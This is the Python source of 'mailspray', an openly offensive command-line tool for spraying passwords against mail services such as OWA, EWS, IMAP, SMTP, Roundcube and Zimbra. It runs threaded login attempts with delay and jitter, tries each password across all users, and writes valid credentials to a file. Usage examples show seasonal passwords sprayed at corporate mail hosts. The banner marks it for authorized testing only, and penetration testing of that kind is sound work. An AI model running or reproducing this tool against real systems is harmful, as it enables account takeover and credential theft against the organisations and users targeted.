#!/usr/bin/env python3

import sys
import os
import time
import random
import argparse
import threading
import warnings
from concurrent.futures import ThreadPoolExecutor, as_completed

warnings.filterwarnings("ignore", category=DeprecationWarning)
warnings.filterwarnings("ignore", message=".*urllib3.*")

sys.path.append(os.path.dirname(os.path.abspath(__file__)))

try:
    from modules import OWAModule, IMAPModule, SMTPModule, RoundcubeModule, EWSModule, ZimbraModule
except ImportError as e:
    print(f"\033[1;31m[!]\033[0m Missing dependency: {e}")
    print(f"\033[1;33m[*]\033[0m Run: pip3 install requests")
    sys.exit(1)

__version__ = "0.3.0"

# ── Colors ──────────────────────────────────────────────────────────

class C:
    R   = "\033[1;31m"    # red
    G   = "\033[1;32m"    # green
    Y   = "\033[1;33m"    # yellow
    B   = "\033[1;34m"    # blue
    C   = "\033[1;36m"    # cyan
    W   = "\033[1;37m"    # white
    D   = "\033[2m"       # dim
    X   = "\033[0m"       # reset

    @staticmethod
    def off():
        C.R = C.G = C.Y = C.B = C.C = C.W = C.D = C.X = ""


# ── Output helpers (NetExec style) ──────────────────────────────────

PROTOCOLS = {
    "owa":       {"name": "OWA",       "cls": OWAModule,       "port": 443},
    "ews":       {"name": "EWS",       "cls": EWSModule,       "port": 443},
    "imap":      {"name": "IMAP",      "cls": IMAPModule,      "port": 993},
    "smtp":      {"name": "SMTP",      "cls": SMTPModule,      "port": 587},
    "roundcube": {"name": "RCUBE",     "cls": RoundcubeModule, "port": 443},
    "zimbra":    {"name": "ZIMBRA",    "cls": ZimbraModule,    "port": 443},
}

def proto_tag(name):
    return f"{C.B}{name:<7}{C.X}"

def log_success(proto, target, user, password):
    print(f"  {proto_tag(proto)} {target:<28} {C.G}[+]{C.X} {user}:{C.G}{password}{C.X}")

def log_fail(proto, target, user, password):
    print(f"  {proto_tag(proto)} {target:<28} {C.R}[-]{C.X} {user}:{C.D}{password}{C.X}")

def log_error(proto, target, user, msg):
    print(f"  {proto_tag(proto)} {target:<28} {C.Y}[!]{C.X} {user} — {C.Y}{msg}{C.X}")

def log_info(msg):
    print(f"  {C.C}[*]{C.X} {msg}")

def log_warn(msg):
    print(f"  {C.Y}[!]{C.X} {msg}")

def log_good(msg):
    print(f"  {C.G}[+]{C.X} {msg}")


# ── Input parsing ───────────────────────────────────────────────────

def load_list(value):
    """Load from file (one per line) or treat as single value."""
    if os.path.isfile(value):
        with open(value, "r") as f:
            return [l.strip() for l in f if l.strip() and not l.startswith("#")]
    return [value]



# ── Spray engine ────────────────────────────────────────────────────

class SprayEngine:
    def __init__(self, args):
        self.args = args
        self.lock = threading.Lock()
        self.found = []
        self.total = 0
        self.done = 0
        self.errors = 0
        self.start_time = None

    def _delay(self):
        if self.args.delay > 0:
            jitter = self.args.jitter * self.args.delay
            sleep_time = max(0, self.args.delay + random.uniform(-jitter, jitter))
            time.sleep(sleep_time)

    def _save(self, proto, target_display, user, password):
        # strip scheme for clean URI: roundcube://user:pass@host:port
        host = target_display
        if "://" in host:
            host = host.split("://", 1)[1]
        host = host.rstrip("/")
        uri = f"{proto}://{user}:{password}@{host}"
        with self.lock:
            self.found.append(uri)
            if self.args.output:
                with open(self.args.output, "a") as f:
                    f.write(uri + "\n")

    def _worker(self, scanner, user, password, proto_key, target):
        self._delay()
        proto_name = PROTOCOLS[proto_key]["name"]

        try:
            result = scanner.login(user, password)
        except Exception as e:
            with self.lock:
                self.errors += 1
                self.done += 1
            if self.args.verbose:
                log_error(proto_name, target, user, str(e)[:60])
            return

        with self.lock:
            self.done += 1

        if result:
            log_success(proto_name, target, user, password)
            self._save(proto_key, target, user, password)
        elif self.args.verbose:
            log_fail(proto_name, target, user, password)

    def run(self, scanner, pairs, proto_key, target):
        self.total = len(pairs)
        self.start_time = time.time()

        log_info(f"Starting spray: {C.W}{self.total}{C.X} combinations / {C.W}{self.args.threads}{C.X} threads")
        if self.args.delay > 0:
            log_info(f"Delay: {self.args.delay}s (jitter: {self.args.jitter})")
        print()

        try:
            with ThreadPoolExecutor(max_workers=self.args.threads) as pool:
                futures = []
                for user, password in pairs:
                    f = pool.submit(self._worker, scanner, user, password, proto_key, target)
                    futures.append(f)
                for f in as_completed(futures):
                    pass  # exceptions handled inside worker
        except KeyboardInterrupt:
            print()
            log_warn("Interrupted by user")

        self._summary()

    def _summary(self):
        elapsed = time.time() - self.start_time
        minutes, seconds = divmod(int(elapsed), 60)

        print()
        print(f"  {C.W}{'─' * 58}{C.X}")
        print(f"  {C.W}Results:{C.X}  {C.G}{len(self.found)} found{C.X}  /  "
              f"{self.done} tested  /  "
              f"{C.Y}{self.errors} errors{C.X}  /  "
              f"{minutes}m {seconds}s")

        if self.found:
            print(f"  {C.W}Creds:{C.X}")
            for uri in self.found:
                print(f"    {C.G}{uri}{C.X}")
            if self.args.output:
                print(f"  {C.W}Saved:{C.X}   {self.args.output}")

        print(f"  {C.W}{'─' * 58}{C.X}")
        print()


# ── CLI ─────────────────────────────────────────────────────────────

BANNER = f"""
{C.R}                 _ __
  __ _  ___ _(_) /__ ___  _______ ___ __
 /  ' \\/ _ `/ / (_-</ _ \\/ __/ _ `/ // /
/_/_/_/\\_,_/_/_/___/ .__/_/  \\_,_/\\_, /
                  /_/    {C.C}v{__version__}{C.R}     /___/{C.X}
{C.D} mail password spraying toolkit // authorized testing only{C.X}
"""


def build_parser():
    parser = argparse.ArgumentParser(
        prog="mailspray",
        description=BANNER,
        formatter_class=argparse.RawDescriptionHelpFormatter,
        add_help=False,
    )

    target = parser.add_argument_group(f"{C.W}TARGET{C.X}")
    target.add_argument("protocol", choices=list(PROTOCOLS.keys()),
                        metavar="PROTOCOL",
                        help=f"Protocol: {', '.join(PROTOCOLS.keys())}")
    target.add_argument("target", metavar="TARGET",
                        help="Host, IP, or URL (e.g. http://mail.corp.com:8080)")
    target.add_argument("-P", "--port", type=int, metavar="PORT",
                        help="Override default port")

    auth = parser.add_argument_group(f"{C.W}CREDENTIALS{C.X}")
    auth.add_argument("-u", "--user", required=True, metavar="USER",
                      help="Username or file with usernames")
    auth.add_argument("-p", "--password", required=True, metavar="PASS",
                      help="Password or file with passwords")
    auth.add_argument("-d", "--domain", metavar="DOMAIN",
                      help="Prepend DOMAIN\\ to usernames")

    engine = parser.add_argument_group(f"{C.W}ENGINE{C.X}")
    engine.add_argument("-t", "--threads", type=int, default=5, metavar="N",
                        help="Thread count (default: 5)")
    engine.add_argument("--delay", type=float, default=0.0, metavar="SEC",
                        help="Delay between requests in seconds")
    engine.add_argument("--jitter", type=float, default=0.0, metavar="0-1",
                        help="Jitter factor for delay (0.0-1.0)")
    engine.add_argument("--timeout", type=int, default=10, metavar="SEC",
                        help="Connection timeout (default: 10)")

    output = parser.add_argument_group(f"{C.W}OUTPUT{C.X}")
    output.add_argument("-o", "--output", default="found.txt", metavar="FILE",
                        help="Output file for valid creds (default: found.txt)")
    output.add_argument("-v", "--verbose", action="store_true",
                        help="Show failed attempts and errors")
    output.add_argument("--no-color", action="store_true",
                        help="Disable colored output")

    misc = parser.add_argument_group(f"{C.W}MISC{C.X}")
    misc.add_argument("-h", "--help", action="help",
                      help="Show this help message")
    misc.add_argument("-V", "--version", action="version",
                      version=f"mailspray v{__version__}",
                      help="Show version")

    parser.epilog = f"""{C.W}USAGE EXAMPLES:{C.X}
  {C.D}# OWA spray (HTTPS by default){C.X}
  mailspray owa mail.corp.com -u users.txt -p 'Winter2026!'

  {C.D}# Full URL when you need HTTP or custom port{C.X}
  mailspray roundcube http://mail.corp.com:8080 -u users.txt -p pass.txt

  {C.D}# Spray with domain prefix{C.X}
  mailspray owa https://mail.corp.com -u users.txt -p pass.txt -d CORP

  {C.D}# IMAP on non-standard port, verbose{C.X}
  mailspray imap 10.10.10.5 -P 143 -u admin@corp.local -p passwords.txt -v

  {C.D}# SMTP with rate limiting{C.X}
  mailspray smtp smtp.target.com -u emails.txt -p passwords.txt -t 3 --delay 2 --jitter 0.5

  {C.D}# EWS with domain prefix{C.X}
  mailspray ews https://mail.corp.com -u users.txt -p passes.txt -d CORP

  {C.D}# Zimbra webmail on HTTP{C.X}
  mailspray zimbra http://webmail.target.com:8443 -u users.txt -p 'Spring2026!'

{C.W}SUPPORTED PROTOCOLS:{C.X}
  owa          Outlook Web Access (Exchange)       [443]
  ews          Exchange Web Services (NTLM/Basic)  [443]
  imap         IMAP with SSL/STARTTLS              [993]
  smtp         SMTP with STARTTLS                  [587]
  roundcube    Roundcube Webmail                    [443]
  zimbra       Zimbra Webmail                      [443]
"""
    return parser


def main():
    if len(sys.argv) == 1:
        build_parser().print_help()
        sys.exit(0)

    parser = build_parser()
    args = parser.parse_args()

    if args.no_color:
        C.off()

    # ── Build credential pairs ──
    users = load_list(args.user)
    passwords = load_list(args.password)
    if not users:
        parser.error("No usernames provided")
    if not passwords:
        parser.error("No passwords provided")

    if args.domain:
        users = [f"{args.domain}\\{u}" if "\\" not in u and "@" not in u else u for u in users]

    # password spraying order: each password against all users first
    pairs = []
    for p in passwords:
        for u in users:
            pairs.append((u, p))

    # ── Init scanner ──
    proto = PROTOCOLS[args.protocol]
    scanner = proto["cls"](args.target)
    scanner.timeout = args.timeout

    if args.port:
        scanner.port = args.port

    # ── Banner ──
    print(BANNER)
    print(f"  {proto_tag(proto['name'])} {C.W}{scanner.base_url()}{C.X}")

    log_info(f"Users: {len(users)}  |  Passwords: {len(passwords)}  |  Total: {len(pairs)}")

    print()

    # ── Run ──
    engine = SprayEngine(args)
    engine.run(scanner, pairs, args.protocol, scanner.base_url())


if __name__ == "__main__":
    main()
